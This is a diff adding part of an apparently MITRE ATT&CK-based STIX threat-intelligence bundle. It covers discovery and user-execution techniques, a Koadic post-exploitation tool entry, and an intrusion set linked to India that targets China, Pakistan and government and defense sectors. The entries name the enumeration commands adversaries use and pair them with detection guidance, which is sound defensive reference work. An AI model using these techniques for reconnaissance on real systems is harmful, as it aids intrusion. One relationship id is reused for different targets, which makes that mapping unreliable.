+                    "description": "Berry, A., Galang, L., Jiang, G., Leathery, J., Mohandas, R. (2017, April 11). CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler. Retrieved October 27, 2017.",
+                    "url": "https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html"
+                },
+                {
+                    "url": "https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/",
+                    "description": "Dove, A. (2016, March 23). Fileless Malware \u2013 A Behavioural Analysis Of Kovter Persistence. Retrieved December 5, 2017.",
+                    "source_name": "Airbus Security Kovter Analysis"
+                },
+                {
+                    "source_name": "FireEye FIN7 April 2017",
+                    "description": "Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017.",
+                    "url": "https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html"
+                },
+                {
+                    "url": "https://en.wikipedia.org/wiki/HTML_Application",
+                    "description": "Wikipedia. (2017, October 14). HTML Application. Retrieved October 27, 2017.",
+                    "source_name": "Wikipedia HTML Application"
+                },
+                {
+                    "url": "https://msdn.microsoft.com/library/ms536471.aspx",
+                    "description": "Microsoft. (n.d.). HTML Applications. Retrieved October 27, 2017.",
+                    "source_name": "MSDN HTML Applications"
+                },
+                {
+                    "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
+                    "description": "LOLBAS. (n.d.). Mshta.exe. Retrieved July 31, 2019.",
+                    "source_name": "LOLBAS Mshta"
+                }
+            ]
+        },
+        {
+            "type": "attack-pattern",
+            "modified": "2021-03-29T16:05:00.456Z",
+            "name": "Software Discovery",
+            "x_mitre_data_sources": [
+                "Firewall: Firewall Metadata",
+                "Firewall: Firewall Enumeration",
+                "Process: Process Creation",
+                "Command: Command Execution",
+                "Process: OS API Execution"
+            ],
+            "x_mitre_version": "1.3",
+            "created": "2019-09-16T17:52:44.147Z",
+            "x_mitre_permissions_required": [
+                "User",
+                "Administrator"
+            ],
+            "x_mitre_platforms": [
+                "Windows",
+                "Azure AD",
+                "Office 365",
+                "SaaS",
+                "IaaS",
+                "Linux",
+                "macOS",
+                "Google Workspace"
+            ],
+            "x_mitre_is_subtechnique": false,
+            "id": "attack-pattern--e3b6daca-e963-4a69-aee6-ed4fd653ad58",
+            "description": "Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from [Software Discovery](https://attack.mitre.org/techniques/T1518) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).",
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "discovery"
+                }
+            ],
+            "x_mitre_detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1518",
+                    "external_id": "T1518",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://capec.mitre.org/data/definitions/580.html",
+                    "external_id": "CAPEC-580",
+                    "source_name": "capec"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "Security Software Discovery",
+            "x_mitre_data_sources": [
+                "Firewall: Firewall Metadata",
+                "Firewall: Firewall Enumeration",
+                "Process: Process Creation",
+                "Command: Command Execution",
+                "Process: OS API Execution"
+            ],
+            "x_mitre_version": "1.2",
+            "modified": "2021-03-29T16:05:00.198Z",
+            "created": "2020-02-21T21:16:18.066Z",
+            "x_mitre_permissions_required": [
+                "User"
+            ],
+            "x_mitre_platforms": [
+                "Windows",
+                "Azure AD",
+                "Office 365",
+                "SaaS",
+                "IaaS",
+                "Linux",
+                "macOS",
+                "Google Workspace"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "id": "attack-pattern--cba37adb-d6fb-4610-b069-dd04c0643384",
+            "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment.(Citation: Expel IO Evil in AWS)",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "discovery"
+                }
+            ],
+            "x_mitre_detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nIn cloud environments, additionally monitor logs for the usage of APIs that may be used to gather information about security software configurations within the environment.",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1518/001",
+                    "external_id": "T1518.001",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://capec.mitre.org/data/definitions/581.html",
+                    "external_id": "CAPEC-581",
+                    "source_name": "capec"
+                },
+                {
+                    "url": "https://expel.io/blog/finding-evil-in-aws/",
+                    "description": "A. Randazzo, B. Manahan and S. Lipton. (2020, April 28). Finding Evil in AWS. Retrieved June 25, 2020.",
+                    "source_name": "Expel IO Evil in AWS"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "System Information Discovery",
+            "x_mitre_data_sources": [
+                "Instance: Instance Metadata",
+                "Process: Process Creation",
+                "Command: Command Execution",
+                "Process: OS API Execution"
+            ],
+            "x_mitre_version": "2.3",
+            "modified": "2021-10-13T23:21:27.750Z",
+            "created": "2017-05-31T21:31:04.307Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "discovery"
+                }
+            ],
+            "id": "attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1",
+            "x_mitre_platforms": [
+                "Windows",
+                "IaaS",
+                "Linux",
+                "macOS"
+            ],
+            "x_mitre_is_subtechnique": false,
+            "x_mitre_permissions_required": [
+                "User"
+            ],
+            "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. [System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques)\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)",
+            "x_mitre_contributors": [
+                "Maril Vernon @shewhohacks",
+                "Praetorian"
+            ],
+            "x_mitre_detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nIn cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information. Depending on how the environment is used, that data alone may not be useful due to benign use during normal operations.",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1082",
+                    "external_id": "T1082",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://capec.mitre.org/data/definitions/312.html",
+                    "external_id": "CAPEC-312",
+                    "source_name": "capec"
+                },
+                {
+                    "url": "https://www.sentinelone.com/blog/trail-osx-fairytale-adware-playing-malware/",
+                    "description": "Phile Stokes. (2018, September 20). On the Trail of OSX.FairyTale | Adware Playing at Malware. Retrieved August 24, 2021.",
+                    "source_name": "OSX.FairyTale"
+                },
+                {
+                    "url": "https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/",
+                    "description": "Phil Stokes. (2021, February 16). 20 Common Tools & Techniques Used by macOS Threat Actors & Malware. Retrieved August 23, 2021.",
+                    "source_name": "20 macOS Common Tools and Techniques"
+                },
+                {
+                    "url": "https://docs.aws.amazon.com/cli/latest/reference/ssm/describe-instance-information.html",
+                    "description": "Amazon. (n.d.). describe-instance-information. Retrieved March 3, 2020.",
+                    "source_name": "Amazon Describe Instance"
+                },
+                {
+                    "url": "https://cloud.google.com/compute/docs/reference/rest/v1/instances",
+                    "description": "Google. (n.d.). Rest Resource: instance. Retrieved March 3, 2020.",
+                    "source_name": "Google Instances Resource"
+                },
+                {
+                    "source_name": "Microsoft Virutal Machine API",
+                    "description": "Microsoft. (2019, March 1). Virtual Machines - Get. Retrieved October 8, 2019.",
+                    "url": "https://docs.microsoft.com/en-us/rest/api/compute/virtualmachines/get"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "System Network Configuration Discovery",
+            "x_mitre_data_sources": [
+                "Process: Process Creation",
+                "Script: Script Execution",
+                "Command: Command Execution",
+                "Process: OS API Execution"
+            ],
+            "x_mitre_version": "1.3",
+            "modified": "2021-10-08T00:17:37.881Z",
+            "created": "2017-05-31T21:30:27.342Z",
+            "x_mitre_permissions_required": [
+                "User"
+            ],
+            "x_mitre_platforms": [
+                "Linux",
+                "macOS",
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": false,
+            "id": "attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0",
+            "description": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).\n\nAdversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. ",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "discovery"
+                }
+            ],
+            "x_mitre_detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1016",
+                    "external_id": "T1016",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://capec.mitre.org/data/definitions/309.html",
+                    "external_id": "CAPEC-309",
+                    "source_name": "capec"
+                }
+            ]
+        },
+        {
+            "type": "attack-pattern",
+            "modified": "2021-08-12T13:34:34.153Z",
+            "name": "System Owner/User Discovery",
+            "x_mitre_data_sources": [
+                "Process: Process Creation",
+                "Command: Command Execution"
+            ],
+            "x_mitre_version": "1.3",
+            "created": "2017-05-31T21:30:35.733Z",
+            "x_mitre_permissions_required": [
+                "User",
+                "Administrator"
+            ],
+            "x_mitre_platforms": [
+                "Linux",
+                "macOS",
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": false,
+            "id": "attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104",
+            "description": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.",
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "discovery"
+                }
+            ],
+            "x_mitre_detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1033",
+                    "external_id": "T1033",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://capec.mitre.org/data/definitions/577.html",
+                    "external_id": "CAPEC-577",
+                    "source_name": "capec"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "System Time Discovery",
+            "x_mitre_data_sources": [
+                "Process: Process Creation",
+                "Command: Command Execution",
+                "Process: OS API Execution"
+            ],
+            "x_mitre_version": "1.2",
+            "modified": "2021-04-22T23:09:24.799Z",
+            "created": "2017-05-31T21:31:37.450Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "discovery"
+                }
+            ],
+            "id": "attack-pattern--f3c544dc-673c-4ef3-accb-53229f1ae077",
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": false,
+            "x_mitre_permissions_required": [
+                "User"
+            ],
+            "description": "An adversary may gather the system time and/or time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. (Citation: MSDN System Time) (Citation: Technet Windows Time Service)\n\nSystem time information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing <code>net time \\\\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>. (Citation: Technet Windows Time Service)\n\nThis information could be useful for performing other techniques, such as executing a file with a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) (Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting (i.e. [System Location Discovery](https://attack.mitre.org/techniques/T1614)). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.(Citation: AnyRun TimeBomb)",
+            "x_mitre_contributors": [
+                "FIRST.ORG's Cyber Threat Intelligence SIG"
+            ],
+            "x_mitre_detection": "Command-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1124",
+                    "external_id": "T1124",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://capec.mitre.org/data/definitions/295.html",
+                    "external_id": "CAPEC-295",
+                    "source_name": "capec"
+                },
+                {
+                    "source_name": "MSDN System Time",
+                    "description": "Microsoft. (n.d.). System Time. Retrieved November 25, 2016.",
+                    "url": "https://msdn.microsoft.com/ms724961.aspx"
+                },
+                {
+                    "source_name": "Technet Windows Time Service",
+                    "description": "Mathers, B. (2016, September 30). Windows Time Service Tools and Settings. Retrieved November 25, 2016.",
+                    "url": "https://technet.microsoft.com/windows-server-docs/identity/ad-ds/get-started/windows-time-service/windows-time-service-tools-and-settings"
+                },
+                {
+                    "source_name": "RSA EU12 They're Inside",
+                    "description": "Rivner, U., Schwartz, E. (2012). They\u2019re Inside\u2026 Now What?. Retrieved November 25, 2016.",
+                    "url": "https://www.rsaconference.com/writable/presentations/file_upload/ht-209_rivner_schwartz.pdf"
+                },
+                {
+                    "url": "https://any.run/cybersecurity-blog/time-bombs-malware-with-delayed-execution/",
+                    "description": "Malicious History. (2020, September 17). Time Bombs: Malware With Delayed Execution. Retrieved April 22, 2021.",
+                    "source_name": "AnyRun TimeBomb"
+                }
+            ]
+        },
+        {
+            "type": "attack-pattern",
+            "modified": "2020-03-11T14:43:31.706Z",
+            "name": "Malicious Link",
+            "x_mitre_data_sources": [
+                "Network Traffic: Network Connection Creation",
+                "Network Traffic: Network Traffic Content",
+                "File: File Creation"
+            ],
+            "x_mitre_version": "1.0",
+            "created": "2020-03-11T14:43:31.706Z",
+            "x_mitre_permissions_required": [
+                "User"
+            ],
+            "x_mitre_platforms": [
+                "Linux",
+                "macOS",
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "id": "attack-pattern--ef67e13e-5598-4adc-bdb2-998225874fa9",
+            "description": "An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Links may also lead users to download files that require execution via [Malicious File](https://attack.mitre.org/techniques/T1204/002).",
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "execution"
+                }
+            ],
+            "x_mitre_detection": "Inspect network traffic for indications that a user visited a malicious site, such as links included in phishing campaigns directed at your organization.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded from a link and executed on the user's computer.",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1204/001",
+                    "external_id": "T1204.001",
+                    "source_name": "mitre-attack"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "Malicious File",
+            "x_mitre_data_sources": [
+                "Process: Process Creation",
+                "File: File Creation"
+            ],
+            "x_mitre_version": "1.1",
+            "modified": "2021-07-21T23:10:47.193Z",
+            "created": "2020-03-11T14:49:36.954Z",
+            "x_mitre_permissions_required": [
+                "User"
+            ],
+            "x_mitre_platforms": [
+                "Linux",
+                "macOS",
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "id": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
+            "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) on the file to increase the likelihood that a user will open it.\n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "execution"
+                }
+            ],
+            "x_mitre_detection": "Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain initial access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) in payloads.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1204/002",
+                    "external_id": "T1204.002",
+                    "source_name": "mitre-attack"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "tool",
+            "name": "Koadic",
+            "x_mitre_aliases": [
+                "Koadic"
+            ],
+            "x_mitre_version": "1.1",
+            "modified": "2020-03-30T16:55:29.911Z",
+            "created": "2018-10-17T00:14:20.652Z",
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "id": "tool--c8655260-9f4b-44e3-85e1-6538a5f6e4f4",
+            "description": "[Koadic](https://attack.mitre.org/software/S0250) is a Windows post-exploitation framework and penetration testing tool. [Koadic](https://attack.mitre.org/software/S0250) is publicly available on GitHub and the tool is executed via the command-line. [Koadic](https://attack.mitre.org/software/S0250) has several options for staging payloads and creating implants. [Koadic](https://attack.mitre.org/software/S0250) performs most of its operations using Windows Script Host. (Citation: Github Koadic) (Citation: Palo Alto Sofacy 06-2018)",
+            "labels": [
+                "tool"
+            ],
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/software/S0250",
+                    "external_id": "S0250",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "description": "(Citation: Github Koadic)",
+                    "source_name": "Koadic"
+                },
+                {
+                    "url": "https://github.com/zerosum0x0/koadic",
+                    "description": "Magius, J., et al. (2017, July 19). Koadic. Retrieved June 18, 2018.",
+                    "source_name": "Github Koadic"
+                },
+                {
+                    "source_name": "Palo Alto Sofacy 06-2018",
+                    "description": "Lee, B., Falcone, R. (2018, June 06). Sofacy Group\u2019s Parallel Attacks. Retrieved June 18, 2018.",
+                    "url": "https://researchcenter.paloaltonetworks.com/2018/06/unit42-sofacy-groups-parallel-attacks/"
+                }
+            ]
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--97d5ea6d-93a6-4a2b-9521-a152e81552b4",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "originates-from",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "target_ref": "location--a2ec23af-45a5-47b4-b1c4-ffa0f55ba748"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--a2ec23af-45a5-47b4-b1c4-ffa0f55ba748",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "India",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--ab5397bf-2f0c-4ead-a598-1cc280375991",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "target_ref": "identity--7119e085-8c5a-4153-bb5c-10c9eb919305"
+        },
+        {
+            "created": "2021-03-13T20:09:21.309978Z",
+            "id": "identity--7119e085-8c5a-4153-bb5c-10c9eb919305",
+            "identity_class": "class",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Government sector as a target",
+            "sectors": [
+                "government"
+            ],
+            "spec_version": "2.1",
+            "type": "identity"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--ab5397bf-2f0c-4ead-a598-1cc280375991",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "target_ref": "identity--aa25fea8-ef34-47b8-83ab-05ac3dc9326d"
+        },
+        {
+            "created": "2021-03-13T20:09:21.304762Z",
+            "id": "identity--aa25fea8-ef34-47b8-83ab-05ac3dc9326d",
+            "identity_class": "class",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Defense sector as a target",
+            "sectors": [
+                "defense"
+            ],
+            "spec_version": "2.1",
+            "type": "identity"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--c1d991d7-4d19-4515-91dc-9ba537e476ae",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "target_ref": "location--f6f6863a-41c0-4108-8a46-880e62ba1aca"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--f6f6863a-41c0-4108-8a46-880e62ba1aca",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "China",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--4e65331c-dce1-4b3c-8dbc-728d5d92ce48",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "target_ref": "location--b9235e9d-2ab7-44e4-9f80-5f31f0f5abd0"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--b9235e9d-2ab7-44e4-9f80-5f31f0f5abd0",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Pakistan",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--97b2acf0-ca44-4bc3-8e03-41d305bb7bc7",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "target_ref": "location--34390956-4eda-418c-bf84-1b2b054778a1"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--34390956-4eda-418c-bf84-1b2b054778a1",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Asia",
+            "spec_version": "2.1",
+            "type": "location"
+        }
+    ]
+}
